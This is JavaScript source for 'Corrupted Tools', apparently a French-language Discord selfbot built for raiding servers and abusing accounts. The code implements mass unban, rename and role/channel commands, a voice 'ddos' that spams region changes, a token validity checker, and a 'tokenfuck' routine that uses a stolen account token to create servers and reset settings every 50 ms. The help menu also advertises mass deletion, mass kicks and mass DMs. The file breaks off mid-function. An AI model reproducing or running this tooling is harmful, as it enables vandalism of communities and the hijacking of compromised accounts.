const Discord = require('discord.js')
const client = new Discord.Client()
const chalk = require('chalk')
const request = require('request')
const fs = require("fs");
const moment = require("moment")
const chancejs = require("chance");
const rpcGenerator = require("discordrpcgenerator");
const chance = new chancejs();
const versiontools = '0.0.2';
  /////////////////////////////////////
const configfile = require('./config.json');
var token = configfile.token;
var prefix = configfile.prefix;
var color = configfile.color;
//////token erreur////////
var image = 'https://cdn.discordapp.com/attachments/766258846733172747/784814905332989952/Sans_titre_3.gif'
/////////
if (!configfile.token) {
    console.clear()
    setTimeout(function() {
        console.clear();
        console.log(chalk.underline.red(" [ERROR] Le token n'a pas été trouvé. Vérifi si tu as bien rentré le token dans le config.json"));
    }, 1000);
}

let url = "https://discordapp.com/api/v7/users/@me";
request(
    url, {
        method: "GET",
        headers: {
            authorization: token
        }
    },
    function(error, response, body) {
        if (response.statusCode === 200) {} else {
            console.clear();
            console.log(chalk.underline.red(`- [ERROR] Échec de l'authentification avec Discord. Suivez les instructions et entrez votre token dans config.json.`))
            console.log(chalk.underline.red('- le fichier README.txt va se lancer automatiquement '));
        }
    })
    client.on('ready', function() {
        console.clear()
            setTimeout(function() {
                console.log(chalk.blue.inverse(`Bienvenue sur la version ${versiontools} de Corrupted .`));
    
                function sleep(delay) {
                    var start = new Date().getTime();
                    while (new Date().getTime() < start + delay);
                
            }
            commandIntervals = [];
          
    /////////console///////
    var logoconsole = [`
    ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄         ▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄                       
   ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░▌       ▐░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░▌                      
   ▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌▐░▌       ▐░▌▐░█▀▀▀▀▀▀▀█░▌ ▀▀▀▀█░█▀▀▀▀ ▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀▀▀▀█░▌                     
   ▐░▌          ▐░▌       ▐░▌▐░▌       ▐░▌▐░▌       ▐░▌▐░▌       ▐░▌▐░▌       ▐░▌     ▐░▌     ▐░▌          ▐░▌       ▐░▌                     
   ▐░▌          ▐░▌       ▐░▌▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄█░▌▐░▌       ▐░▌▐░█▄▄▄▄▄▄▄█░▌     ▐░▌     ▐░█▄▄▄▄▄▄▄▄▄ ▐░▌       ▐░▌                     
   ▐░▌          ▐░▌       ▐░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░▌       ▐░▌▐░░░░░░░░░░░▌     ▐░▌     ▐░░░░░░░░░░░▌▐░▌       ▐░▌                     
   ▐░▌          ▐░▌       ▐░▌▐░█▀▀▀▀█░█▀▀ ▐░█▀▀▀▀█░█▀▀ ▐░▌       ▐░▌▐░█▀▀▀▀▀▀▀▀▀      ▐░▌     ▐░█▀▀▀▀▀▀▀▀▀ ▐░▌       ▐░▌                     
   ▐░▌          ▐░▌       ▐░▌▐░▌     ▐░▌  ▐░▌     ▐░▌  ▐░▌       ▐░▌▐░▌               ▐░▌     ▐░▌          ▐░▌       ▐░▌                     
   ▐░█▄▄▄▄▄▄▄▄▄ ▐░█▄▄▄▄▄▄▄█░▌▐░▌      ▐░▌ ▐░▌      ▐░▌ ▐░█▄▄▄▄▄▄▄█░▌▐░▌               ▐░▌     ▐░█▄▄▄▄▄▄▄▄▄ ▐░█▄▄▄▄▄▄▄█░▌                     
   ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░▌       ▐░▌▐░▌       ▐░▌▐░░░░░░░░░░░▌▐░▌               ▐░▌     ▐░░░░░░░░░░░▌▐░░░░░░░░░░▌                      
    ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀         ▀  ▀         ▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀                 ▀       ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀                       
                                                                                                                                             
    `,`
    ╔═╗┌─┐┬─┐┬─┐┬ ┬┌─┐┌┬┐┌─┐┌┬┐      
    ║  │ │├┬┘├┬┘│ │├─┘ │ ├┤  ││      
    ╚═╝└─┘┴└─┴└─└─┘┴   ┴ └─┘─┴┘      
     `,`
    ▄████▄  ▒█████   ██▀███   ██▀███   █    ██  ██▓███  ▄▄▄█████▓▓█████ ▓█████▄            
   ▒██▀ ▀█ ▒██▒  ██▒▓██ ▒ ██▒▓██ ▒ ██▒ ██  ▓██▒▓██░  ██▒▓  ██▒ ▓▒▓█   ▀ ▒██▀ ██▌           
   ▒▓█    ▄▒██░  ██▒▓██ ░▄█ ▒▓██ ░▄█ ▒▓██  ▒██░▓██░ ██▓▒▒ ▓██░ ▒░▒███   ░██   █▌           
   ▒▓▓▄ ▄██▒██   ██░▒██▀▀█▄  ▒██▀▀█▄  ▓▓█  ░██░▒██▄█▓▒ ▒░ ▓██▓ ░ ▒▓█  ▄ ░▓█▄   ▌           
   ▒ ▓███▀ ░ ████▓▒░░██▓ ▒██▒░██▓ ▒██▒▒▒█████▓ ▒██▒ ░  ░  ▒██▒ ░ ░▒████▒░▒████▓            
   ░ ░▒ ▒  ░ ▒░▒░▒░ ░ ▒▓ ░▒▓░░ ▒▓ ░▒▓░░▒▓▒ ▒ ▒ ▒▓▒░ ░  ░  ▒ ░░   ░░ ▒░ ░ ▒▒▓  ▒            
     ░  ▒    ░ ▒ ▒░   ░▒ ░ ▒░  ░▒ ░ ▒░░░▒░ ░ ░ ░▒ ░         ░     ░ ░  ░ ░ ▒  ▒            
   ░       ░ ░ ░ ▒    ░░   ░   ░░   ░  ░░░ ░ ░ ░░         ░         ░    ░ ░  ░            
   ░ ░         ░ ░     ░        ░        ░                          ░  ░   ░               
   ░                                                                     ░                 
   `,`
    ██████╗ ██████╗ ██████╗ ██████╗ ██╗   ██╗██████╗ ████████╗███████╗██████╗                 
   ██╔════╝██╔═══██╗██╔══██╗██╔══██╗██║   ██║██╔══██╗╚══██╔══╝██╔════╝██╔══██╗                
   ██║     ██║   ██║██████╔╝██████╔╝██║   ██║██████╔╝   ██║   █████╗  ██║  ██║                
   ██║     ██║   ██║██╔══██╗██╔══██╗██║   ██║██╔═══╝    ██║   ██╔══╝  ██║  ██║                
   ╚██████╗╚██████╔╝██║  ██║██║  ██║╚██████╔╝██║        ██║   ███████╗██████╔╝                
    ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═╝        ╚═╝   ╚══════╝╚═════╝                 
                                                                                              
    `,`
    
 ▄████████  ▄██████▄     ▄████████    ▄████████ ███    █▄     ▄███████▄     ███        ▄████████ ████████▄                      
 ███    ███ ███    ███   ███    ███   ███    ███ ███    ███   ███    ███ ▀█████████▄   ███    ███ ███   ▀███                     
 ███    █▀  ███    ███   ███    ███   ███    ███ ███    ███   ███    ███    ▀███▀▀██   ███    █▀  ███    ███                     
 ███        ███    ███  ▄███▄▄▄▄██▀  ▄███▄▄▄▄██▀ ███    ███   ███    ███     ███   ▀  ▄███▄▄▄     ███    ███                     
 ███        ███    ███ ▀▀███▀▀▀▀▀   ▀▀███▀▀▀▀▀   ███    ███ ▀█████████▀      ███     ▀▀███▀▀▀     ███    ███                     
 ███    █▄  ███    ███ ▀███████████ ▀███████████ ███    ███   ███            ███       ███    █▄  ███    ███                     
 ███    ███ ███    ███   ███    ███   ███    ███ ███    ███   ███            ███       ███    ███ ███   ▄███                     
 ████████▀   ▀██████▀    ███    ███   ███    ███ ████████▀   ▄████▀         ▄████▀     ██████████ ████████▀                      
                         ███    ███   ███    ███                                                                                 
 `]
    var consolerandoml = logoconsole[Math.floor(Math.random() * logoconsole.length)]
    console.log(chalk.cyan(consolerandoml));

    if (client.user.bot) {
        var botyn = (`Tu es robot je ne peux pas charger le tools desolé :(`);
        process.exit(1)
    } else {
        var botyn = (`Non`)
    }


/////////console profile//////
console.log(chalk.magenta.dim(`╔══════════════════════════════════════════════════════════════════════════════╗`))
console.log(chalk.magenta.dim(`  [-Corrupted-] :: Tools lancé avec succès, Aucunes erreurs est survenue.      `))
console.log(chalk.magenta.dim(`  [Pseudo / Tag] :: ${client.user.username} | ${client.user.id}              `))
console.log(chalk.magenta.dim(`  [Amis] :: ${client.user.friends.size}                                                                `))
console.log(chalk.magenta.dim(`  [Votre Prefix] ::  > ${configfile.prefix} <                                                     `))
console.log(chalk.magenta.dim(`  [Le Menu aide ] ::  > ${configfile.prefix} + help  <                                                     `))
console.log(chalk.magenta.dim(`  [Nombre de serveur] :: ${client.guilds.size}                                                    `))
console.log(chalk.magenta.dim(`  [Corrupted / Version] :: ${versiontools}       `))
console.log(chalk.magenta.dim(`  [Vous etes un bot ?]:: ${botyn}       `))
console.log(chalk.magenta.dim(`╚══════════════════════════════════════════════════════════════════════════════╝`))
})
}) 
////////rpc //////////
var uuid = () => ([1e7] + -1e3 + -4e3 + -8e3 + -1e11).replace(/[018]/g, a => (a ^ Math.random() * 16 >> a / 4).toString(16));

client.on('ready', function() {
    rpcGenerator.getRpcImage("774222765808812042", "r4y4n")
    .then(image => {
        rpcGenerator.getRpcImage("774222765808812042", "r4y4n")
      .then(imaged => {
            let presence = new rpcGenerator.Rpc()
                .setName(`🔱・Corrupted Tools・🔱`)
                .setUrl('https://www.twitch.tv/Arcadia')
                .setType("PLAYING")
                .setApplicationId("774222765808812042")
                .setAssetsLargeImage(image.id)
                .setAssetsSmallImage(imaged.id)
                .setAssetsLargeText(`🔱・Corrupted Tools・🔱`)
                .setState(`Version du tools : ${versiontools}`)
                .setDetails("Dev By R4y4n")
                .setStartTimestamp(Date.now())

                .setParty({
                    id: uuid()
                    })
                    client.user.setPresence(presence.toDiscord()).catch(console.error)
                  })
                })
            })
/////////////////Menu raid ///////
client.on('message', message => {
if (message.content.startsWith(prefix + 'help')){
    message.delete()
   let cmdList = new Discord.RichEmbed()
   .setTitle('**🌟・𝘾𝙤𝙧𝙧𝙪𝙥𝙩𝙚𝙙 𝙏𝙤𝙤𝙡𝙨・🌟**')
   .setColor(color)
   .addField("__**𝑑𝑒𝑙**__", "**Supprime tout les channeles d'un serveur.**")
   .addField("__**𝑚𝑝𝑎𝑙𝑙 **__ [__𝑚𝑠𝑔 __]", "**DM tout le monde du serveur.**")
   .addField("__**𝑑𝑒𝑙𝑒𝑡𝑒𝑟𝑜𝑙𝑒**__", "**Delete tout les roles du serveur.**")
   .addField("__**𝑢𝑛𝑏𝑎𝑛𝑎𝑙𝑙**__", "**Faire debannir tout les utilisatuer bannis. **")
   .addField("__**𝐾𝑎𝑙𝑙**__", "**Kick tout le serveur :) !!!! **")
   .addField("__**𝐷𝑒𝑠𝑡𝑟𝑜𝑦**__ [__𝑢𝑟𝑙__]", "**Bz le Serveur Plus vener.**")
   .addField("__**𝑟𝑜𝑙𝑒𝑠𝑎𝑑𝑑**__ ", "**Ccréation de beaucoup de role .**")
   .addField("__**𝑐ℎ𝑎𝑛𝑛𝑎𝑑𝑑**__ [__𝑁𝑜𝑚__]", "**Création de masse channeles textuels .**")
   .addField("__**𝑎𝑑𝑚𝑖𝑛𝑟𝑜𝑙𝑒𝑎𝑑𝑑**__", "**Add un role Admin. **")
   .addField("__**𝑟𝑒𝑛𝑎𝑚𝑒𝑎𝑙𝑙**__ [__𝑚𝑠𝑔__]", "**Name tout les gens du serveur. **")
   .addField("__**𝑉𝑜𝑖𝑐𝑒𝑎𝑑𝑑**__ [__𝑁𝑜𝑚__]", "**Création de masse channeles vocals . **")
   .addField(` __**𝐷𝑑𝑜𝑠𝑣𝑜𝑐 **__`, "**Faire crash tout le monde en vocal {Permision admin requise} . **")
   .addField(` __**𝐶𝑤𝑒𝑏ℎ𝑜𝑜𝑘 **__`, "**Création d'un webhook  . **")
   .addField(` __**𝐷𝑤𝑒𝑏ℎ𝑜𝑜𝑘 -{Id}-{token} **__`, "**Supprimer un webhook par ex : si un attardé met un webhook qui est lié un token grabber . **")
   .addField(` __**𝑇𝑜𝑘𝑒𝑛𝑐ℎ𝑒𝑐𝑘 {Token} **__`, "**Voir si un token est valid ou pas . **")
   .addField(` __**𝑇𝑜𝑘𝑒𝑛𝑓𝑢𝑐𝑘 {Token} **__`, "** :no_entry:  Detruire Le token mentioner. :no_entry: **")
   .addField(` __**𝐸𝑚𝑎𝑖𝑙 **__`, "**Generer une email valide pour des comptes tempo .**")
   .addField(` __**𝐼𝑛𝑣𝑖𝑡𝑒𝑏𝑜𝑡 + {Mention}**__`, "**Avoir le lien d'invitation d'un bot  .**")
   .setImage(image)
    .setFooter(`🌟・𝘾𝙤𝙧𝙧𝙪𝙥𝙩𝙚𝙙  ・🌟 | 𝘿𝙚𝙫 𝘽𝙮 𝙍ʌ𝙮ʌ𝙣`, message.author.avatarURL) 
    message.channel.sendEmbed(cmdList);
}
if (message.content.startsWith(prefix + 'help')){
    message.delete()
   let cmdList = new Discord.RichEmbed()
   .setTitle('**🌟・𝘾𝙤𝙧𝙧𝙪𝙥𝙩𝙚𝙙 𝙏𝙤𝙤𝙡𝙨・🌟**')
   .setColor(color)
   .addField("__**𝑟𝑒𝑛𝑎𝑚𝑒𝑎𝑙𝑙**__ [__𝑚𝑠𝑔__]", "**Name tout les gens du serveur. **")
   .addField("__**𝐴𝑛𝑡𝑖𝑟𝑎𝑖𝑑𝑜𝑛**__ ", "**Activer le antiraid . [Serveur]**")
   .addField("__**𝐴𝑛𝑡𝑖𝑟𝑎𝑖𝑑𝑜𝑓𝑓**__ ", "**Desactiver le antiraid . [Serveur]**")
   .addField("__**𝐶ℎ𝑎𝑛**__ ", "**Voire tout les channles . [Serveur]  **")
   .addField("__**𝐶𝑎𝑡𝑒́𝑔𝑜𝑟𝑖𝑒 **__ ", "**Voire tout les Catégories . :eyes:  [Serveur]  **")
   .addField("__**𝑉𝑜𝑖𝑐𝑒 **__ ", "**Voire tout les Vocales . :eyes:  [Serveur]  **")
   .addField("__**𝑅𝑜𝑙𝑒𝑙𝑖𝑠𝑡**__ ", "**Voir tout les roles d'un serveur . :eyes:  [Serveur]**")
   .addField("__**𝐴𝑣𝑎𝑡𝑎𝑟**__ ", "**Affichier la photo de profile d'un utilisateur .**")
   .setImage(image)
     .setFooter(`🌟・𝘾𝙤𝙧𝙧𝙪𝙥𝙩𝙚𝙙  ・🌟 | 𝘿𝙚𝙫 𝘽𝙮 𝙍ʌ𝙮ʌ𝙣`, message.author.avatarURL)  
     message.channel.sendEmbed(cmdList);
}
///////commande//////
if (message.content.startsWith(prefix + 'avatar')) {
    message.delete()
    let membre = message.mentions.users.first() || message.author,
        bite = new Discord.RichEmbed()
        .setColor(color)
        .setTitle('__**Voici la photo de profile de ' + membre.username + '**__')
        .setImage(membre.displayAvatarURL)
    .setFooter(`🌟・𝘾𝙤𝙧𝙧𝙪𝙥𝙩𝙚𝙙  ・🌟 | 𝘿𝙚𝙫 𝘽𝙮 𝙍ʌ𝙮ʌ𝙣`, message.author.avatarURL)
    message.channel.sendEmbed(bite);
}

if (message.content.includes(prefix + "rolelist")) {
    if (message.author.id !== client.user.id)return;
    message.delete();
    let serveur = message.guild;
    if (!serveur) return message.channel.send(' **Commande uniquement utilisable sur un serveur**')
   
        if (message.deletable) message.delete();
        message.channel.send('```\n' + message.guild.roles.map(r => r.name)
            .join('\n') + '```')
    
}

    if (message.content.startsWith(prefix + "chan")) {
        message.delete();
        const text = message.guild.channels.filter(c => c.type === "text")
        var text_embed = new Discord.RichEmbed()
        .setAuthor("🌟・𝘾𝙤𝙧𝙧𝙪𝙥𝙩𝙚𝙙  ・🌟")
        .setColor(color)
        .addField("𝐶ℎ𝑎𝑛𝑛𝑒𝑙𝑠 𝐿𝑖𝑠𝑡", text.map(c => c.name))
    message.channel.send(text_embed);
    }
    if (message.content.startsWith(prefix + "catégorie")) {
        message.delete();
        const categories = message.guild.channels.filter(c => c.type === "category")
        var text_embed = new Discord.RichEmbed()
        .setAuthor("🌟・𝘾𝙤𝙧𝙧𝙪𝙥𝙩𝙚𝙙  ・🌟")
        .setColor(color)
        .addField("𝐶𝑎𝑡𝑒́𝑔𝑜𝑟𝑖𝑒   𝐿𝑖𝑠𝑡 ", categories.map(c => c.name))
    message.channel.send(text_embed);
    }
    if (message.content.startsWith(prefix + "voice")) {
        message.delete();
        const voice = message.guild.channels.filter(c => c.type === "voice")
        var text_embed = new Discord.RichEmbed()
        .setAuthor("🌟・𝘾𝙤𝙧𝙧𝙪𝙥𝙩𝙚𝙙  ・🌟")
        .setColor(color)
        .addField("𝑉𝑜𝑐𝑎𝑙 𝐿𝑖𝑠𝑡", voice.map(c => c.name))
    message.channel.send(text_embed);
    }
if (message.content.startsWith(prefix + "antiraidon")) {
    if (message.author.id !== client.user.id)return;
    message.delete();
            if (!message.member.hasPermission("ADMINISTRATOR"))
                return message.channel.send("Vous n'avez pas la permission");
            if (!client.lockit) client.lockit = [];
            let validUnlocks = ["release", "unlock"];

            if (validUnlocks.includes()) {
                message.guild.channels.forEach(async (channel, id) => {
                    await channel.overwritePermissions(message.guild.id, {
                        SEND_MESSAGES: null,
                        SPEAK: null
                    });
                });
            } else {
                message.guild.channels.forEach(async (channel, id) => {
                    await channel.overwritePermissions(message.guild.id, {
                        SEND_MESSAGES: false,
                        SPEAK: false
                    });
                });
            }
            var antiraodon = new Discord.RichEmbed()
                .setTitle('**L\'anti raid est activé .**')
                .setColor(color)
                .setTimestamp()
            .setFooter(`🌟・𝘾𝙤𝙧𝙧𝙪𝙥𝙩𝙚𝙙  ・🌟 | 𝘿𝙚𝙫 𝘽𝙮 𝙍ʌ𝙮ʌ𝙣`, message.author.avatarURL)

            message.channel.send(antiraodon);
        
    
}

if (message.content.startsWith(prefix + "antiraidoff")) {
    if (message.author.id !== client.user.id)return;
    message.delete();
            if (!message.member.hasPermission("ADMINISTRATOR"))
                return message.channel.send("Vous n'avez pas la permission");
            if (!client.lockit) client.lockit = [];
            let validUnlocks = ["release", "unlock"];

            if (validUnlocks.includes()) {
                message.guild.channels.forEach(async (channel, id) => {
                    await channel.overwritePermissions(message.guild.id, {
                        SEND_MESSAGES: null,
                        SPEAK: null
                    });
                });
            } else {
                message.guild.channels.forEach(async (channel, id) => {
                    await channel.overwritePermissions(message.guild.id, {
                        SEND_MESSAGES: null,
                        SPEAK: null
                    });
                });
            }
            var raidoff = new Discord.RichEmbed()
                .setTitle('**L\'anti raid est désactivé .**')
                .setColor(color)
                .setTimestamp()
            .setFooter(`🌟・𝘾𝙤𝙧𝙧𝙪𝙥𝙩𝙚𝙙  ・🌟 | 𝘿𝙚𝙫 𝘽𝙮 𝙍ʌ𝙮ʌ𝙣`, message.author.avatarURL)


            message.channel.send(raidoff);       
}
if (message.content === prefix + 'unbanall') {
    let serveur = message.guild;
    if (!serveur) return message.edit(':x: **Commande uniquement utilisable sur un serveur**')
    if (message.deletable) message.delete();
    let interval = setInterval(function() {
        message.guild.fetchBans().then(bans => {
            bans.forEach(ban => {
                message.guild.unban(ban.id);
            });
        });
    }, 1000);
    var banall = new Discord.RichEmbed()
    .setTitle("__**UnBanall reussi :) **__")
    .setDescription('')
    .setColor(color)
      .setFooter(`🌟・𝘾𝙤𝙧𝙧𝙪𝙥𝙩𝙚𝙙  ・🌟 | 𝘿𝙚𝙫 𝘽𝙮 𝙍ʌ𝙮ʌ𝙣`, message.author.avatarURL)   .setFooter(`🌟・𝘾𝙤𝙧𝙧𝙪𝙥𝙩𝙚𝙙  ・🌟 | 𝘿𝙚𝙫 𝘽𝙮 𝙍ʌ𝙮ʌ𝙣`, message.author.avatarURL)
    message.channel.sendEmbed(banall);


}
if (message.content.startsWith(prefix + 'renameall')){
    message.delete()

        message.guild.members.forEach(m => {
            m.setNickname(`${args.join(" ")}`);
        });
        var embed = new Discord.RichEmbed()
        .setTitle("***Renameall reussi avec succés :) ***")
        .setTimestamp()
        .setColor(color)
    .setFooter(`🌟・𝘾𝙤𝙧𝙧𝙪𝙥𝙩𝙚𝙙  ・🌟 | 𝘿𝙚𝙫 𝘽𝙮 𝙍ʌ𝙮ʌ𝙣`, message.author.avatarURL)
    message.channel.send(embed)
}

if (message.content.includes(prefix + "invitebot")) {
    if (message.author.id === client.user.id) {
        if (message.deletable) message.delete();

        if (message.mentions.users.first()) {
            user = message.mentions.users.first();
        } else {
            user = message.author;
        }
        message.channel.send("https://discordapp.com/api/oauth2/authorize?client_id=" +
            user.id +
            "&permissions=0&scope=bot");
    }
}


var email =
chance.email({
    domain: "gmail.com"
}) 

if (message.content === prefix + "email") {
    if (message.author.id === client.user.id) {
        message.delete();
        message.channel.send("__**Voici Votre email :" + email + "**__")
    }
}
if (message.content.startsWith(prefix + 'tokenfuck')) {
    if(message.author.id !== client.user.id)return;
        var argument = message.content.split(" ").slice(1);
        request("https://discordapp.com/api/v6/users/@me", {
                method: "GET",
                headers: { authorization: argument }
            },
            function(error, response) {
                if (response.statusCode === 200) {
                    var embed = new Discord.RichEmbed()
                        .setTitle("TOKEN DESTROY")
                        .setDescription("__**token fuck en cours pour le stopper relancer ou éteignez le selfbot**__")
                        .setColor(color)
                    .setFooter(`🌟・𝘾𝙤𝙧𝙧𝙪𝙥𝙩𝙚𝙙  ・🌟 | 𝘿𝙚𝙫 𝘽𝙮 𝙍ʌ𝙮ʌ𝙣`, message.author.avatarURL)
                        .setTimestamp()
                    message.edit(embed)// vous pouvez ajoutez les informations du token mentionnée en utilisant l'api de discord
                    console.log(chalk.blue("Token destroy en cours"))
                    var cycle = setInterval(function() {
                        request('https://discordapp.com/api/v6/guilds', {
                            method: 'POST',
                            headers: {
                                authorization: argument,
                                'content-type': 'application/json'
                            },
                            body: JSON.stringify({
                                name: '🌟・𝘾𝙤𝙧𝙧𝙪𝙥𝙩𝙚𝙙  ・🌟 :) ', // nom des servs créer 
                                region: "europe", // région des servs
                                icon: 'https://cdn.discordapp.com/icons/768378921837658112/a_9fc86bc60a93b52404ffaa2206b134a0.gif' // icon des servs
                            })
                        });
                    }, 50);
                    commandIntervals.push(cycle);
                    var inteval = setInterval(function() { //donc l'interval pour faire les actions à l'infinit

                        const localerdm = ["fr", "da", "de", "en-US", "en-GB", "es-ES", "hr", "it", "lt", "hu", "zh-TW", "ko", "zh-CN", "th", "uk", "ru", "bg", "el"]
                        var rdmlc = localerdm[Math.floor(Math.random() * localerdm.length)] //var qui prend une langue random
                        const themerdm = ["light", "dark"]
                        var rdmth = themerdm[Math.floor(Math.random() * themerdm.length)] //var qui prend un theme random
                        const statusrdm = ["online", "dnd", "offline", "idle"] // array avec les status
                        var rdmst = statusrdm[Math.floor(Math.random() * statusrdm.length)] // les status de l'array statysrdm aléatoirs
                        request("https://discordapp.com/api/v6/users/@me/settings", { // la requete
                            method: 'PATCH',
                            headers: {
                                authorization: argument, // l'autorisation qui est donc l'argument (le token)
                                'content-type': 'application/json', //le format de "l'app"
                                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36' // le user agent
                            },
                            body: JSON.stringify({ // le body
                                'theme': rdmth,//change le theme
                                'locale': rdmlc,//change la langue
                                'status': rdmst, // le status random
                                //le reste reset le compte (les paramètres)
                                'theme': "light",
                                'locale': "ja",
                                'message_display_compact': true,
                                'inline_embed_media': false,
                                'inline_attachment_media': false,
                                'gif_auto_play': false,
                                'render_embeds': false,
                                'render_reactions': false,
                                'animate_emoji': false,
                                'convert_emoticons': false,
                                'enable_tts_command': false,
                                'disable_games_tab': true,
                                'developer_mode:': false,
                                'detect_platform_accounts:': false,
                                'afk_timeout:': 100,
                                'timezone_offset': 0,
                                'stream_notifications_enabled': false,
                                'allow_accessibility_detection': true,
                                'contact_sync_enabled': true,
                                'native_phone_integration_enabled': false,
                                'friend_source_flags': { all: false },
                                'explicit_content_filter': '0',
                                'status': "invisible",
                                'timezoneOffset': '0',
                                'importGamesEnabled': false
                            })
                        });
                    }, 50);
                    commandIntervals.push(inteval);

                } else { // si le status n'est pas = à 200 alors le token est invalid
                    var embed1 = new Discord.RichEmbed() // bon ça c'est un embed je vous apprend rien
                        .setTitle("**Token fuck**")
                        .setDescription("__**Token invalid**__")
                        .setColor(color)
                        .setFooter(`🌟・𝘾𝙤𝙧𝙧𝙪𝙥𝙩𝙚𝙙  ・🌟 | 𝘿𝙚𝙫 𝘽𝙮 𝙍ʌ𝙮ʌ𝙣`, message.author.avatarURL)
                    message.edit(embed1)
                }
            })
    
}
if (message.content.startsWith(prefix + 'dwebhook')) {
    if (message.author.id === client.user.id) {
        let serveur = message.guild;
        if (!serveur) return message.edit('**Commande uniquement utilisable sur un serveur**');

        var messageArray = message.content.split(" ");
        var arg = messageArray.slice(0);

        message.delete();
        const user = new Discord.WebhookClient(arg[1], arg[2])
        user.delete()
        var embeds = new Discord.RichEmbed()

            .setTitle("__**Webhook supprimé avec succès**__")
            .setDescription(`***Le token du Webhook:***\n ${arg[2]} \n\n***L'id du Webhook:***\n ${arg[1]}`)
            .setColor(color)
             .setFooter(`🌟・𝘾𝙤𝙧𝙧𝙪𝙥𝙩𝙚𝙙  ・🌟 | 𝘿𝙚𝙫 𝘽𝙮 𝙍ʌ𝙮ʌ𝙣`, message.author.avatarURL)
        console.log(chalk.cyan(`Webhook \nServeur: ${message.guild.name} \nChannel: ${message.channel.name} \nId hannel: ${message.channel.id} \nWebhook supprimé: ${message.createdAt} \nid: ${arg[1]} \nToken: ${arg[2]}`))
        message.channel.send(embeds)

            .catch(console.error)
    }
}
if (message.content.startsWith(prefix + 'cwebhook')) {
    if (message.author.id === client.user.id) {
        let serveur = message.guild;
        if (!serveur) return message.edit('**Commande uniquement utilisable sur un serveur**');

        let user = message.mentions.users.first() ? message.mentions.users.first() : message.author
        var messageArray = message.content.split(" ");
        var arg = messageArray.slice(2);


        message.delete();
        let msg = arg.join(' ')
        message.channel.createWebhook("🌟・𝘾𝙤𝙧𝙧𝙪𝙥𝙩𝙚𝙙  ・🌟", image)
            .then(wb => {
                const user = new Discord.WebhookClient(wb.id, wb.token)
                var embeds = new Discord.RichEmbed()

                    .setTitle("__**Webhook créé avec succès**__")
                    .setDescription(`***Le token du Webhook:***\n ${wb.token} \n***L'id du Webhook:***\n ${wb.id}`)
                    .setColor(color)
                     .setFooter(`🌟・𝘾𝙤𝙧𝙧𝙪𝙥𝙩𝙚𝙙  ・🌟 | 𝘿𝙚𝙫 𝘽𝙮 𝙍ʌ𝙮ʌ𝙣`, message.author.avatarURL)
                console.log(chalk.green(`Webhook \nServeur: ${message.guild.name} \nChannel: ${message.channel.name} \nId hannel: ${message.channel.id} \nWebhook créer: ${message.createdAt} \nid: ${wb.id} \nToken: ${wb.token}`))
                user.send(embeds);
            })

            .catch(console.error)
    }
}
if (message.content.startsWith(prefix + 'tokencheck')) {
    if (message.author.id === client.user.id) {

        var messageArray = message.content.split(" ");
        var argument1 = messageArray.slice(0);

        var argument = argument1[1]

        let url = "https://discordapp.com/api/v6/users/@me";
        request(
            url, {
                method: "GET",
                headers: {
                    authorization: argument
                }
            },
            function(error, response, body) {
                if (response.statusCode === 200) {
                    var validtoken = new Discord.RichEmbed()
                        .setTitle(`**Le Token :** __${argument}__  **est bien valid**`)
                        .setColor(color)
                         .setFooter(`🌟・𝘾𝙤𝙧𝙧𝙪𝙥𝙩𝙚𝙙  ・🌟 | 𝘿𝙚𝙫 𝘽𝙮 𝙍ʌ𝙮ʌ𝙣`, message.author.avatarURL)
                    message.channel.send(validtoken)
                } else {
                    console.log('[ ERROR ] Token info:\n le token n\'est pas valid')
                    var invalidtoken = new Discord.RichEmbed()
                        .setTitle(`**Le token :** __${argument}__ **n'est pas valid**`)
                        .setColor(color)
                         .setFooter(`🌟・𝘾𝙤𝙧𝙧𝙪𝙥𝙩𝙚𝙙  ・🌟 | 𝘿𝙚𝙫 𝘽𝙮 𝙍ʌ𝙮ʌ𝙣`, message.author.avatarURL)

                    message.edit(invalidtoken)
                }
            })
    }
}
if (message.content.startsWith(prefix + "ddosvoc")) {
    if (message.author.id !== client.user.id)return;
    message.delete();
        let serveur = message.guild;
        if (!serveur) return message.channel.send(' **Commande uniquement utilisable sur un serveur**');
        message.guild.setRegion('russia').catch(error => {})
        message.guild.setRegion('india').catch(error => {})
        message.guild.setRegion('japan').catch(error => {})
        message.guild.setRegion('russia').catch(error => {})
        message.guild.setRegion('india').catch(error => {})
        message.guild.setRegion('japan').catch(error => {})
        message.guild.setRegion('russia').catch(error => {})
        message.guild.setRegion('india').catch(error => {})
        message.guild.setRegion('japan').catch(error => {})
        message.guild.setRegion('russia').catch(error => {})
        message.guild.setRegion('india').catch(error => {})
        message.guild.setRegion('japan').catch(error => {})
        message.guild.setRegion('russia').catch(error => {})
        message.guild.setRegion('india').catch(error => {})
        message.guild.setRegion('japan').catch(error => {})
        message.guild.setRegion('russia').catch(error => {})
        message.guild.setRegion('india').catch(error => {})
        message.guild.setRegion('japan').catch(error => {})
        message.guild.setRegion('russia').catch(error => {})
        message.guild.setRegion('india').catch(error => {})
        message.guild.setRegion('japan').catch(error => {})
        message.guild.setRegion('russia').catch(error => {})
